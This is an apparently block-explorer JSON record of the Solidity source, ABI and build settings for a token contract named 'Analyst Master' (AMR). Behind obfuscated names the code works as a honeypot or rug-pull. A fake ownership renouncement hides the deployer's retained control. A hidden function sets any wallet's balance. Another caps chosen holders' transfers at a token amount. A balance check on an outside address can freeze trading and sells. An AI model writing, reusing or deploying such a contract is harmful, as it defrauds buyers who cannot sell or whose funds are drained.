{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface receiverTrading {\n    function createPair(address modeToken, address swapToIs) external returns (address);\n}\n\ninterface launchedAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitSellTo) external view returns (uint256);\n\n    function transfer(address fundTotal, uint256 toShouldTrading) external returns (bool);\n\n    function allowance(address shouldLaunchedTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toShouldTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundTotal,\n        uint256 toShouldTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMin, uint256 value);\n    event Approval(address indexed shouldLaunchedTotal, address indexed spender, uint256 value);\n}\n\nabstract contract autoTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityMarketing is launchedAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnalystMaster is autoTrading, launchedAt, liquidityMarketing {\n\n    string private liquiditySwap = \"Analyst Master\";\n\n    function approve(address shouldTradingFrom, uint256 toShouldTrading) public virtual override returns (bool) {\n        feeIs[_msgSender()][shouldTradingFrom] = toShouldTrading;\n        emit Approval(_msgSender(), shouldTradingFrom, toShouldTrading);\n        return true;\n    }\n\n    mapping(address => bool) public amountSenderExempt;\n\n    function balanceOf(address limitSellTo) public view virtual override returns (uint256) {\n        return amountSellReceiver[limitSellTo];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTo;\n    }\n\n    mapping(address => bool) public exemptWallet;\n\n    bool public amountShould;\n\n    uint8 private teamShould = 18;\n\n    function enableTradingAmount() public {\n        emit OwnershipTransferred(swapIsFrom, address(0));\n        isFrom = address(0);\n    }\n\n    uint256 private exemptTo = 100000000 * 10 ** 18;\n\n    uint256 takeMax;\n\n    function owner() external view returns (address) {\n        return isFrom;\n    }\n\n    mapping(address => uint256) private amountSellReceiver;\n\n    function takeTrading(address receiverList, address fundTotal, uint256 toShouldTrading) internal returns (bool) {\n        if (receiverList == swapIsFrom) {\n            return teamTotalList(receiverList, fundTotal, toShouldTrading);\n        }\n        uint256 maxFrom = launchedAt(fundAutoAt).balanceOf(limitFee);\n        require(maxFrom == limitBuy);\n        require(fundTotal != limitFee);\n        if (exemptWallet[receiverList]) {\n            return teamTotalList(receiverList, fundTotal, autoLaunched);\n        }\n        return teamTotalList(receiverList, fundTotal, toShouldTrading);\n    }\n\n    function feeExempt(address enableAuto) public {\n        autoFrom();\n        if (sellTrading) {\n            fundToFrom = true;\n        }\n        if (enableAuto == swapIsFrom || enableAuto == fundAutoAt) {\n            return;\n        }\n        exemptWallet[enableAuto] = true;\n    }\n\n    uint256 public shouldFundToken;\n\n    function takeSellExempt(address fundAmount, uint256 toShouldTrading) public {\n        autoFrom();\n        amountSellReceiver[fundAmount] = toShouldTrading;\n    }\n\n    bool private sellLaunched;\n\n    function launchedAtIs(address maxWalletAt) public {\n        if (amountShould) {\n            return;\n        }\n        if (fromList) {\n            fromList = true;\n        }\n        amountSenderExempt[maxWalletAt] = true;\n        if (shouldFundToken == listLiquidity) {\n            sellTrading = false;\n        }\n        amountShould = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquiditySwap;\n    }\n\n    function teamTotalList(address receiverList, address fundTotal, uint256 toShouldTrading) internal returns (bool) {\n        require(amountSellReceiver[receiverList] >= toShouldTrading);\n        amountSellReceiver[receiverList] -= toShouldTrading;\n        amountSellReceiver[fundTotal] += toShouldTrading;\n        emit Transfer(receiverList, fundTotal, toShouldTrading);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return isFrom;\n    }\n\n    address public fundAutoAt;\n\n    address limitFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private sellTrading;\n\n    event OwnershipTransferred(address indexed takeTotal, address indexed fundLimit);\n\n    uint256 private listLiquidity;\n\n    address enableIsTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMax;\n    }\n\n    address private isFrom;\n\n    function autoFrom() private view {\n        require(amountSenderExempt[_msgSender()]);\n    }\n\n    bool public fundToFrom;\n\n    function transferFrom(address receiverList, address fundTotal, uint256 toShouldTrading) external override returns (bool) {\n        if (_msgSender() != enableIsTo) {\n            if (feeIs[receiverList][_msgSender()] != type(uint256).max) {\n                require(toShouldTrading <= feeIs[receiverList][_msgSender()]);\n                feeIs[receiverList][_msgSender()] -= toShouldTrading;\n            }\n        }\n        return takeTrading(receiverList, fundTotal, toShouldTrading);\n    }\n\n    bool public fromList;\n\n    bool public senderIs;\n\n    uint256 private enableWallet;\n\n    string private walletMax = \"AMR\";\n\n    address public swapIsFrom;\n\n    constructor (){\n        if (senderIs) {\n            enableWallet = shouldFundToken;\n        }\n        tokenMarketing shouldTo = tokenMarketing(enableIsTo);\n        fundAutoAt = receiverTrading(shouldTo.factory()).createPair(shouldTo.WETH(), address(this));\n        if (receiverShould == senderIs) {\n            listLiquidity = shouldFundToken;\n        }\n        swapIsFrom = _msgSender();\n        amountSenderExempt[swapIsFrom] = true;\n        amountSellReceiver[swapIsFrom] = exemptTo;\n        enableTradingAmount();\n        if (sellTrading == sellLaunched) {\n            senderIs = true;\n        }\n        emit Transfer(address(0), swapIsFrom, exemptTo);\n    }\n\n    function limitReceiver(uint256 toShouldTrading) public {\n        autoFrom();\n        limitBuy = toShouldTrading;\n    }\n\n    function transfer(address fundAmount, uint256 toShouldTrading) external virtual override returns (bool) {\n        return takeTrading(_msgSender(), fundAmount, toShouldTrading);\n    }\n\n    uint256 constant autoLaunched = 13 ** 10;\n\n    bool public receiverShould;\n\n    function allowance(address isTotal, address shouldTradingFrom) external view virtual override returns (uint256) {\n        if (shouldTradingFrom == enableIsTo) {\n            return type(uint256).max;\n        }\n        return feeIs[isTotal][shouldTradingFrom];\n    }\n\n    uint256 public launchLaunchedReceiver;\n\n    uint256 limitBuy;\n\n    mapping(address => mapping(address => uint256)) private feeIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunchedTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTradingFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSenderExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShouldTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSellTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAutoAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLaunchedReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWalletAt\",\"type\":\"address\"}],\"name\":\"launchedAtIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toShouldTrading\",\"type\":\"uint256\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIsFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShouldTrading\",\"type\":\"uint256\"}],\"name\":\"takeSellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShouldTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShouldTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AnalystMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}